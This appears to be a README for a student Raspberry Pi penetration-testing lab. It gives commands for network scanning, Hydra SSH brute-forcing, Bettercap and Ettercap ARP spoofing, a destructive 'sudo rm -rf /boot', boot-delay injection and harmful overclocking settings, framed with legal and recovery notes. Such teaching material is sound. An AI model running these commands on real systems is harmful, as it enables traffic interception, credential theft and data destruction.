
# 🔐 Raspberry Pi Penetration Testing Project

A comprehensive penetration testing project using Raspberry Pi as both an attack platform and target device. This project demonstrates various attack vectors including Man-in-the-Middle attacks, network discovery, SSH exploitation, boot partition manipulation, and hardware-level attacks.

> ⚠️ **LEGAL NOTICE**: Use only on systems you own or have explicit written authorization to test. You are responsible for complying with all applicable laws and policies.

---

## Table of Contents

- [Project Overview](#project-overview)
- [Setup](#setup)
- [Attack Techniques](#attack-techniques)
  - [Network Discovery & Scanning](#network-discovery--scanning)
  - [Brute-force Attack (Hydra)](#brute-force-attack-hydra)
  - [Man-in-the-Middle (MITM) Attacks](#man-in-the-middle-mitm-attacks)
  - [SSH Access & Boot Partition Inspection](#ssh-access--boot-partition-inspection)
  - [Boot Delay Injection & File Editing](#boot-delay-injection--file-editing)
  - [Overclocking & Hardware Impact](#overclocking--hardware-impact)
- [Safety and Recovery Procedures](#safety-and-recovery-procedures)
- [Project Structure](#project-structure)
- [Prerequisites](#prerequisites)
- [Installation Requirements](#installation-requirements)
- [Ethical Guidelines](#ethical-guidelines)

---

## Project Overview

This project covers:
- Man-in-the-Middle (MITM) attacks using Bettercap, Ettercap & Wireshark
- Network discovery and scanning techniques
- SSH access and privilege escalation
- Boot partition inspection and manipulation
- Destructive testing and recovery procedures
- Boot delay injection attacks
- Hardware overclocking attacks
- File system manipulation

---

## Setup

1. Flash and install the 64-bit Raspbian operating system to an SD card using an SD card reader.
2. Connect the Raspberry Pi (Raspberry Pi 4 Model B) to a monitor, keyboard, and power.
3. Use a Kali Linux virtual machine (VMware) to perform the penetration tests.

---

## Attack Techniques

### Network Discovery & Scanning

**Basic Network Discovery:**

Discover devices on the network:
```bash
arp -a
```

**Network Scanning:**

Scan hosts and services:
```bash
arp -a
nmap -Pn 192.168.XX.X
```

These commands locate active targets and services for further exploitation.

### Brute-force Attack (Hydra)

Create `username` and `password` lists (two text documents). Example files: `username.txt` and `password.txt` (these files included the correct credentials used in the test: `CSE` / `CSE`).

Run Hydra against SSH:
```bash
hydra -L <path_to_username_list> -P <path_to_password_list> ssh://<target_ip>
```

### Man-in-the-Middle (MITM) Attacks

**Bettercap Setup and Usage:**

Install Bettercap:
```bash
sudo apt install bettercap
```

Launch Bettercap with elevated privileges:
```bash
sudo bettercap
```

In-session commands for ARP spoofing:
```bash
net.show
set arp.spoof.targets 192.168.121.174
arp.spoof on
net.sniff on
```

**Ettercap GUI Method:**

Launch Ettercap with GUI:
```bash
ettercap -G
```

Follow GUI workflow:
1. Scan the network for hosts
2. Select target(s)
3. Start ARP poisoning
4. Monitor intercepted traffic

**Wireshark Analysis:**

Launch Wireshark for packet analysis:
```bash
wireshark
```

These steps allow interception and observation of network traffic originating from the Raspberry Pi target.

### SSH Access & Boot Partition Inspection

**Boot Partition Inspection:**

After obtaining SSH access, inspect the boot partition:
```bash
ls -lah /boot/firmware
```

**⚠️ DESTRUCTIVE TEST (Lab Environment Only):**

In a controlled test environment, critical boot files can be removed:
```bash
sudo rm -rf /boot
```

**WARNING**: This renders the device unbootable. Recovery requires:
1. Reimaging the SD card
2. Reinstalling Raspbian OS

### Boot Delay Injection & File Editing

**Availability Attack - Boot Delay:**

Append boot delay to configuration:
```bash
echo "boot_delay=60" | sudo tee -a /path/to/config.txt
```

**System File Modification:**

Edit system files:
```bash
sudo nano /path/to/file.txt
```

**Impact**: These modifications can produce multi-hour boot delays, demonstrating how attackers can impact system availability through configuration file manipulation.

### Overclocking & Hardware Impact

**⚠️ DANGEROUS - Lab Testing Only:**

Modify `/boot/config.txt` with aggressive overclocking settings:
```bash
sudo nano /boot/config.txt
```

Add the following dangerous settings:
```
force_turbo=1
over_voltage=8
arm_freq=2400
gpu_freq=850
```

**Results Observed:**
- Excessive heat generation
- System instability
- Failure to reboot
- Potential hardware damage

**Risk Assessment**: Demonstrates thermal and hardware risks from unsafe configuration changes.

---

## Safety and Recovery Procedures

### Recovery Methods

1. **SD Card Recovery:**
   - Reimage SD card with fresh OS
   - Restore from backup if available

2. **Configuration Rollback:**
   - Boot from recovery mode
   - Restore original config files
   - Remove malicious modifications

3. **Hardware Reset:**
   - Remove power completely
   - Allow cooling period for overheated components
   - Check for physical damage

---

## Project Structure

```
Penetration-Testing-using-Raspberry-pi/
├── Docs/                     # Documentation and reports
│   ├── 2ND REPORT RASPBERRY.pdf
│   ├── Bootloader_Presentation.pdf
│   ├── Raspberry Pi As A Target_updated.pdf
│   └── Raspberry pi report 3.pdf
├── scripts/                  # Attack scripts and tools
├── logs/                     # Attack logs and evidence
└── README.md                 # This documentation
```

---

## Prerequisites

- Raspberry Pi (3B+ or 4 recommended)
- Kali Linux or Raspbian OS
- Network access for MITM attacks
- SSH enabled on target devices
- **Written authorization for all testing**

---

## Installation Requirements

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install penetration testing tools
sudo apt install -y bettercap ettercap-text-only wireshark nmap

# Install additional utilities
sudo apt install -y nano tee
```

---

## Ethical Guidelines

- Only test on systems you own or have explicit permission to test
- Document all activities for learning purposes
- Immediately report any unintended access or damage
- Follow responsible disclosure practices
- Ensure destructive tests are performed only in isolated lab environments

---

## Learning Outcomes

Upon completion, you will understand:
- Network traffic interception techniques
- ARP spoofing and MITM attack vectors
- Boot process manipulation
- Hardware-level attack surfaces
- Recovery and incident response procedures
- The importance of proper security configurations

---

**Disclaimer**: This project is for educational purposes only. All techniques should be used responsibly and legally.
